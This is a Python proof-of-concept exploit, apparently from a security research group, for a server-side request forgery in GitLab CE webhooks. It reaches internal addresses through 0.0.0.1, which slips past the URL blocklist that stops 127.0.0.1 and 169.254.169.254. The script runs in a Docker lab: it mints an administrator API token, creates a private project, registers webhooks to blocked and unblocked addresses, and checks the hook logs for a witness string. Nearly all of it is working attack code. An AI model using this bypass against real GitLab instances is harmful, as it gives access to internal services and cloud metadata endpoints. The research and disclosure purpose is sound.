#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: gitlab-webhook-0net-ssrf (High: 8.5)
#  Vendor: GitLab CE (GitLab Inc.)
#  Versions: GitLab CE <= 19.4.1
#  Impact: Webhook SSRF via UrlBlocker 0.0.0.0/8 hole
#  Requires: authenticated Maintainer webhook on loopback GitLab CE
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "gitlab-webhook-0net-ssrf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""GitLab CE 19.4.1 webhook SSRF via UrlBlocker 0.0.0.0/8 hole."""


import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

WITNESS = "GITLAB-WEBHOOK-0NET-SSRF-WITNESS"
LABEL = "GITLAB-WEBHOOK-0NET-SSRF"
GITLAB = os.environ.get("GITLAB_URL", "http://127.0.0.1:18420").rstrip("/")
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "gitlab-webhook-0net-ssrf")
HERE = os.path.dirname(os.path.abspath(__file__))
CATCHER_URL = "http://0.0.0.1:18080/"
LOOPBACK_URL = "http://127.0.0.1:18080/"
LINKLOCAL_URL = "http://169.254.169.254/"
READY_TIMEOUT = int(os.environ.get("GITLAB_READY_TIMEOUT", "1200"))


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def blocked_text(status: int, body: str) -> bool:
    blob = f"{status} {body}".lower()
    needles = (
        "is blocked",
        "invalid url",
        "localhost",
        "loopback",
        "link local",
        "local network",
        "not allowed",
        "blocked url",
    )
    return status in (400, 422) and any(n in blob for n in needles)


def http(
    method: str,
    path: str,
    token: str | None = None,
    payload: dict | None = None,
    timeout: int = 60,
) -> tuple[int, str]:
    url = path if path.startswith("http") else f"{GITLAB}{path}"
    data = None
    headers = {"Accept": "application/json"}
    if token:
        headers["PRIVATE-TOKEN"] = token
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return 0, str(exc.reason)


def wait_ready() -> None:
    deadline = time.time() + READY_TIMEOUT
    last = "none"
    while time.time() < deadline:
        req = urllib.request.Request(
            f"{GITLAB}/users/sign_in",
            headers={"Accept": "text/html"},
            method="GET",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                status = resp.getcode()
                body = resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status = exc.code
            body = exc.read().decode("utf-8", "replace")
        except urllib.error.URLError as exc:
            status = 0
            body = str(exc.reason)
        last = f"{status} {body[:80]!r}"
        if status == 200 and ("sign_in" in body.lower() or "password" in body.lower() or "gitlab" in body.lower()):
            log(f"gitlab-ready {last}")
            return
        log(f"gitlab-wait {last}")
        time.sleep(8)
    fail(f"gitlab not ready after {READY_TIMEOUT}s last={last}")


def mint_pat() -> str:
    ruby = r"""
user = User.find_by_username('root')
raise 'no root user' unless user
user.personal_access_tokens.where(name: 'cve-lab-webhook-0net').find_each(&:revoke!)
pat = user.personal_access_tokens.create!(
  name: 'cve-lab-webhook-0net',
  scopes: [:api],
  expires_at: 364.days.from_now
)
puts "PAT=#{pat.token}"
"""
    last = ""
    for attempt in range(1, 9):
        log(f"mint-pat gitlab-rails runner attempt={attempt}")
        proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ruby, timeout=300)
        out = (proc.stdout or "") + (proc.stderr or "")
        last = f"rc={proc.returncode}"
        log(f"mint-pat {last}")
        for line in out.splitlines():
            if line.startswith("PAT=") and len(line) > 8:
                log("mint-pat ok")
                return line.split("=", 1)[1].strip()
        err = out[-800:].replace("PAT=", "PAT=<redacted>=")
        last = f"rc={proc.returncode} out={err}"
        time.sleep(20)
    fail(f"pat mint failed {last}")


def rails_log_body() -> str:
    ruby = r"puts WebHookLog.order(:created_at).last&.response_body.to_s"
    proc = compose("exec", "-T", "gitlab", "gitlab-rails", "runner", ruby, timeout=180)
    out = (proc.stdout or "").strip()
    if proc.returncode != 0:
        err = (proc.stderr or "")[-800:]
        log(f"rails-log rc={proc.returncode} {err}")
        return ""
    return out


def catcher_probe() -> str:
    proc = compose(
        "exec",
        "-T",
        "gitlab",
        "curl",
        "-fsS",
        "-m",
        "5",
        "-X",
        "POST",
        "--data",
        "probe=1",
        CATCHER_URL,
        timeout=30,
    )
    body = (proc.stdout or "") + (proc.stderr or "")
    log(f"catcher-probe rc={proc.returncode} body={body[:200]!r}")
    return body


def create_project(token: str) -> int:
    status, body = http("POST", "/api/v4/projects", token, {"name": "hook-lab", "visibility": "private"})
    if status in (200, 201):
        pid = json.loads(body)["id"]
        log(f"project id={pid}")
        return int(pid)
    if status == 400 and "has already been taken" in body.lower():
        status, body = http("GET", "/api/v4/projects?search=hook-lab&simple=true", token)
        if status == 200:
            for row in json.loads(body):
                if row.get("name") == "hook-lab":
                    log(f"project reused id={row['id']}")
                    return int(row["id"])
    fail(f"project create {status} {body[:500]}")


def create_hook(token: str, project_id: int, url: str) -> tuple[int, str]:
    status, body = http(
        "POST",
        f"/api/v4/projects/{project_id}/hooks",
        token,
        {
            "url": url,
            "push_events": True,
            "enable_ssl_verification": False,
            "name": "0net-lab",
        },
        timeout=30,
    )
    log(f"hook-create url={url} status={status} body={body[:400]!r}")
    return status, body


def trigger_hook(token: str, project_id: int, hook_id: int) -> tuple[int, str]:
    path = f"/api/v4/projects/{project_id}/hooks/{hook_id}/test/push_events"
    status, body = http("POST", path, token, {}, timeout=90)
    log(f"hook-test status={status} body={body[:400]!r}")
    return status, body


def commit_trigger(token: str, project_id: int) -> None:
    path = f"/api/v4/projects/{project_id}/repository/files/{urllib.parse.quote('lab.txt', safe='')}"
    status, body = http(
        "POST",
        path,
        token,
        {
            "branch": "main",
            "content": "lab",
            "commit_message": "trigger webhook",
        },
        timeout=60,
    )
    if status in (200, 201):
        log("commit-trigger ok")
        return
    if status == 400:
        status, body = http(
            "PUT",
            path,
            token,
            {
                "branch": "main",
                "content": f"lab {time.time()}",
                "commit_message": "trigger webhook",
            },
            timeout=60,
        )
        log(f"commit-trigger put status={status}")
        if status in (200, 201):
            return
    fail(f"commit trigger {status} {body[:400]}")


def hook_events_body(token: str, project_id: int, hook_id: int) -> str:
    status, body = http("GET", f"/api/v4/projects/{project_id}/hooks/{hook_id}/events", token)
    log(f"hook-events status={status} body={body[:600]!r}")
    if status != 200:
        return ""
    try:
        rows = json.loads(body)
    except json.JSONDecodeError:
        return body
    texts = []
    if isinstance(rows, list):
        for row in rows:
            if isinstance(row, dict):
                texts.append(str(row.get("response_body") or ""))
    return "\n".join(texts)


def main() -> None:
    log(f"lab {LABEL} gitlab={GITLAB} catcher={CATCHER_URL}")
    wait_ready()

    probe = catcher_probe()
    if WITNESS not in probe:
        fail("kernel does not deliver 0.0.0.1 to catcher (or catcher not bound)")

    token = mint_pat()
    project_id = create_project(token)

    neg_a_status, neg_a_body = create_hook(token, project_id, LOOPBACK_URL)
    if not blocked_text(neg_a_status, neg_a_body):
        fail(f"NEGATIVE A 127.0.0.1 expected 422 blocked got {neg_a_status} {neg_a_body[:200]}")
    log("negative-a 127.0.0.1 blocked")

    neg_b_status, neg_b_body = create_hook(token, project_id, LINKLOCAL_URL)
    if not blocked_text(neg_b_status, neg_b_body):
        fail(f"NEGATIVE B 169.254.169.254 expected 422 blocked got {neg_b_status} {neg_b_body[:200]}")
    log("negative-b link-local blocked")

    pos_status, pos_body = create_hook(token, project_id, CATCHER_URL)
    if pos_status in (400, 422) and blocked_text(pos_status, pos_body):
        fail(f"0.0.0.1 is blocked ({pos_status} {pos_body[:200]})")
    if pos_status not in (200, 201):
        fail(f"positive hook create {pos_status} {pos_body[:300]}")

    try:
        hook_id = int(json.loads(pos_body)["id"])
    except (json.JSONDecodeError, KeyError, TypeError, ValueError):
        fail(f"positive hook missing id {pos_body[:300]}")
    log(f"positive-hook id={hook_id}")

    test_status, test_body = trigger_hook(token, project_id, hook_id)
    if test_status == 404:
        log("hook test endpoint 404; falling back to dummy commit")
        commit_trigger(token, project_id)
        time.sleep(8)
    elif test_status == 429:
        log("hook test rate-limited; waiting then dummy commit")
        time.sleep(15)
        commit_trigger(token, project_id)
        time.sleep(8)

    blob = hook_events_body(token, project_id, hook_id)
    if WITNESS not in blob:
        log("rest events missed witness; rails WebHookLog")
        blob = rails_log_body()
        log(f"rails-log body={blob[:400]!r}")

    if WITNESS in blob:
        success(f"webhook response_body from 0.0.0.1:18080 hook_id={hook_id}")

    catcher_logs = compose("logs", "--tail=40", "catcher", timeout=30)
    log("catcher-logs " + ((catcher_logs.stdout or "") + (catcher_logs.stderr or ""))[-1500:])
    if test_status in (200, 201) and WITNESS not in blob:
        fail("hook test returned success but response_body missing witness")
    fail("kernel/webhook did not return witness in hook log")


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:  # noqa: BLE001 — last-line FAIL contract
        fail(f"exception {type(exc).__name__}: {exc}")

